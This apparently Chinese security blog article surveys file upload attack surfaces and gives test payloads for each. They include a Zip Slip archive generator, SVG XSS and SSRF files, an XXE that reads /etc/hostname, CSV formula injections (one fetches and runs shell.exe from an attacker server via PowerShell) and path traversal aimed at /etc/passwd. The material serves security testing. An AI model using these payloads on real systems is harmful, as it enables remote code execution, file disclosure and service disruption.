## ****前言****

对文件上传漏洞介绍文章中 ****漏洞危害**** 部分的补充和完善，主要介绍文件上传功能点有哪些攻击面。

文章内容主要围绕下方的思维导图

![1651905908_627615745adbff29827ee.png!small?1651905909016](https://image.3001.net/images/20220507/1651905908_627615745adbff29827ee.png!small?1651905909016)

##  ** **允许直接上传shell****

只要有文件上传功能，那么就可以尝试上传webshell直接执行恶意代码，获得服务器权限，这是最简单也是最直接的利用。

##  ** **允许上传压缩包****

如果可以上传压缩包，并且服务端会对压缩包解压，那么就可能存在Zip
Slip目录走访漏洞；恶意攻击者通过构造一个压缩文件条目中带有../的压缩文件，上传后交给应用程序进行解压，由于程序解压时没有对压缩包内部的文件名进行合法性的校验，而是直接将文件名拼接在待解压目录后面，导致可以将文件解压到正常解压缩路径之外并覆盖可执行文件，从而等待系统或用户调用他们实现代码执行（也可能是覆盖配置文件或其他敏感文件）。

 ** **本质：**** 没有对压缩包中的文件名进行合法性校验，直接将文件名拼接到待解压目录中，导致存在路径遍历风险

 ** **举例：****
若解压目录为/webapp/web/，给文件命名为：../../var/www/html/1.php并压缩，那么文件解压后，通过直接拼接文件名为/webapp/web/../../var/www/html/1.php，因此最终就会存放到/var/www/html/1.php中，如果能访问并解析，那么就能成功代码执行。

 ** **利用：****[zip-slip-vulnerability](https://github.com/snyk/zip-slip-vulnerability)这个仓库包含了有关此攻击的所有信息，例如受影响的库、项目和其他相关信息。

 ** **构造代码：****

也可以用别人写好的工具：<https://github.com/ptoomey3/evilarc>

import zipfile  
# the name of the zip file to generate  
zf = zipfile.ZipFile('out.zip', 'w')  
# the name of the malicious file that will overwrite the origial file (must
exist on disk)  
fname = 'zip_slip.txt'  
#destination path of the file  
zf.write(fname,
'../../../../../../../../../../../../../../../../../../../../../../../../tmp/zip_slip.aaa')

![1651905925_627615859ca36231c2314.png!small?1651905929741](https://image.3001.net/images/20220507/1651905925_627615859ca36231c2314.png!small?1651905929741)

##  ** **允许上传HTML或SVG****

允许上传html或者svg都可以能导致xss，也能导致任意URL跳转，甚至还能导致SSRF（很难利用），因为核心还是js代码可控

html造成XSS就不多说了，懂得都懂

主要说说svg文件如何造成xss

 ** **检查思路：****

创建一个恶意的svg文件，输入如下内容：

<?xml version="1.0" standalone="no"?>  
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">  
< ** **svg**** version="1.1" baseProfile="full"
xmlns="http://www.w3.org/2000/svg">  
< ** **polygon**** id="triangle" points="0,0 0,50 50,0" fill="#009900"
stroke="#004400"/>  
< ** **script**** type="text/javascript">  
alert(document.domain);  
</ ** **script**** >  
</ ** **svg**** >

上传到文件中，并访问

![1651908598_62761ff6b4d769410e913.png!small?1651908599133](https://image.3001.net/images/20220507/1651908598_62761ff6b4d769410e913.png!small?1651908599133)

  

[!tip|style:flat]

如果目标存在导出功能，如给svg导出为pdf这种功能，那么可能存在SSRF

< ** **svg**** xmlns:svg="http://www.w3.org/2000/svg"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
width="200" height="200">  
< ** **image**** height="30" width="30"  
xlink:href="https://controlledserver.com/pic.svg" />  
</ ** **svg**** >

可尝试使用其他协议更直观的查看，如file://

##  ** **允许上传CSV****

如果允许上传CSV文件，且上传的CSV文件的内容未经过处理过滤直接保存，那么可以尝试上传具有恶意命令执行payload的CSV文件，当其他用户下载该CSV文件时，可能会导致命令执行。

CSV Payload

DDE ("cmd";"/C calc";"!A0")A0  
@SUM(1+9)*cmd|' /C calc'!A0  
=10+20+cmd|' /C calc'!A0  
=cmd|' /C notepad'!'A1'  
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0  
=cmd|'/c rundll32.exe \\\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1

 ** **检查思路：****

上传恶意的CSV文件

下载恶意的CSV文件

观察下载后的CSV文件是否对等号=等特殊符号做了处理，payloads会否会成功执行，如果能则说明存在问题

##  ** **允许上传XML格式文件并解析****

如果允许上传XML格式文件，如docx、xlsx、svg等本质是xml的文件，且后端会对上传的文件进行解析，那么可能存在XXE

以恶意svg为例，一般尝试OOB外带注入的方式来判断最快

<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM
"file:///etc/hostname" > ]>< ** **svg**** width="128px" height="128px"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
version="1.1">< ** **text**** font-size="16" x="0" y="16">&ampxxe</ **
**text**** ></ ** **svg**** >

恶意的XXE文档生成：[docem](https://github.com/whitel1st/docem.git)

##  ** **允许上传PDF****

可能存在PDF XSS和任意URL跳转，但是由于属于浏览器层面的漏洞，所以厂商大概率不认可。

可以直接使用工具生成：<https://github.com/harunoz/js_pdf_xss.git>

也可以按照网上的操作，用迅捷PDF编辑器去操作，效果都一样

##  ** **允许上传大文件****

文件上传的时候，服务端通常会对上传的文件进行大小限制，范围一般为5MB-200
MB，甚至更小/更大，具体取决于应用程序逻辑。但是如果未限制文件大小或不存在相关的验证检查，那么攻击者可能会上传相对较大的文件，造成大量资源消耗，从而可能导致拒绝服务。

 ** **检查思路：****

创建一个超大的图片文件，如500M的png，并上传图片

新开一个浏览器页面或从另一台设备浏览网站，查看响应速度是否变慢或是否存在连接错误等异常情况

##  ** **像素洪水攻击****

任意可以上传图片的地方都可以进行测试；在Pixel Flood
Attack中，攻击者尝试上传具有大像素的文件（64250x64250像素），一些应用会使用第三方组件/库对图像进行缩小处理，以节省存储空间和处理能力，但是这些第三方库在处理的时候，会将“整个图像”加载到内存中，它会尝试将4128062500像素分配到内存中，从而消耗服务器资源，导致应用最终崩溃宕机。

 ** **检查思路：****

在<https://www.resizepixel.com/>中调整图片大小为 64250x64250，上传图片（现在好像不行了，所以我找了个直接能用的
[pixel_flood_lottapixel.jpg](%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%94%BB%E5%87%BB.assets/pixel_flood_lottapixel.jpg)）

新开一个浏览器页面或从另一台设备浏览网站，查看响应速度是否变慢或是否存在连接错误等异常情况

[hackerone $500 实例](https://hackerone.com/reports/390)

##  ** **会对图片二次渲染****

若服务端使用存在漏洞的组件对上传图片进行二次渲染等操作，那么也可以尝试RCE，如[ImageMagick](https://www.acunetix.com/vulnerabilities/web/imagemagick-remote-code-execution/)

一些ImageMagick相关的CVE：

  * CVE-2016–3714 — Insufficient shell characters filtering leading to (potentially remote) code execution
  * CVE-2016–3715 — File deletion
  * CVE-2016–3716 — File moving
  * CVE-2016–3717 — Local file read
  * CVE-2016–3718 — SSRF

##  ** **不会对上传文件重命名****

一些网站配置不当，或者开发安全意识不严谨，将用户上传的文件直接按原名存储到服务器中，那么我们就可以尝试将文件名添加回溯符../，以上传文件到任意目录，甚至覆盖文件，达到getshell或者破坏系统的目的。

[!tip]

在windows中由于部分符号不能作为文件名，如果我们将文件名设置为带有这些特殊符号的内容，那么可能让服务器抛出异常

较少的情况下，可以控制上传的目录名，也可以通过路径遍历的方法上传到任意目录中。

如将文件名设置为../../../../etc/passwd，然后上传对应的内容，那么则有可能直接覆盖掉/etc/passwd

一般情况下尽量去覆盖不会对系统产生影响且我们可以直接观察到的文件，如robots.txt等

##  ** **服务端的注入****

服务端可能对上传的文件名进行各种处理，如展示到页面、存储到数据库等，因此可能存在各种各样的注入，如XSS、SQLI等

如上传文件名为test.png，那么我们可以设置变量为§test§.png，然后fuzz一下各种注入的payload，如sleep(10)---.png、<h1>test<h1>.png、${2*3} 等

##  ** **元数据泄漏****

元数据是照片背后的故事，它告诉我们图像文件是如何创建的，在哪里和何时创建的。它还描述了照片的内容，确定了摄影师，并向您展示了图像在后期处理中是如何编辑的。简单地说，假设您使用数码相机单击了一张图片，当该图像被处理并保存在存储设备上时，一些属性被添加到文件中，例如作者、位置、设备信息和其他适用于描述图像信息的信息。

如果服务端对用户上传的图片未进行处理就直接展示，那么将可能会导致源数据泄漏；通常情况下，元数据中包含GPS地址、设备信息等，会被当作低危。

[!note]

元数据泄漏不仅限于图片，还可以在其他文件格式中找到，如PDF

 ** **检查方法：****

在头像上传等图片可以被枚举的功能点上传包含有exif敏感信息的图片，没有的话可以用手机现拍

下载刚才上传的图片（如果用下面的在线平台这一步可以省略）

使用 <http://exif.regex.info/exif.cgi>或者 exiftool 去分析数据

![1651908615_62762007c9a9811440a5c.png!small?1651908618878](https://image.3001.net/images/20220507/1651908615_62762007c9a9811440a5c.png!small?1651908618878)

##  ** **插件****

![1651908624_627620105a6855da503ff.png!small?1651908624615](https://image.3001.net/images/20220507/1651908624_627620105a6855da503ff.png!small?1651908624615)

##  ** **参考文章****

> [File Upload Attacks (Part
> 1)](https://blog.yeswehack.com/yeswerhackers/exploitation/file-upload-> attacks-part-1/)
>
> [File Upload Attacks (Part
> 2)](https://blog.yeswehack.com/yeswerhackers/file-upload-attacks-part-2/)

